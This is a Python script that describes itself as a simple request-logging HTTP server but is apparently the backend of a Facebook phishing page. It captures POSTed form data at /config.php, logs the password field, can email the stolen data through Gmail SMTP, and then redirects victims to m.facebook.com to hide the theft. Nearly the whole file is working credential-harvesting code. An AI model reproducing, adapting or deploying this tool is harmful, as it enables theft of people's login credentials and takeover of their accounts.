#!/usr/bin/env python3
"""
Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
"""
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import logging
import smtplib


user = ""   # CHANGE
pwd = ""    # CHANGE

smtpServer = "smtp.gmail.com"
smtpPort = 587

mailFrom = user
mailTo = "" # CHANGE

msg = f"""From: From Person <%s>
To: To Person <%s>
Subject: SMTP e-mail test

This is a test e-mail message.

%s
"""


class S(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_body = post_data.decode('utf-8')
        
        if self.path == '/config.php':
            #logging.info(f"POST request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_body}\n")
            data = parse_qs(post_body)
            logging.info(data)
            logging.info(data['password'])

        # CHANGE
        # self.send_mail(post_body)
        self.send_response(301)
        self.send_header('Location', 'https://m.facebook.com/')
        self.end_headers()

    def send_mail(self, data):
        server = smtplib.SMTP(smtpServer, smtpPort)
        server.starttls()
        server.login(user, pwd)
        server.sendmail(mailFrom, mailTo, msg % (mailFrom, mailTo, data))
        server.quit()

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
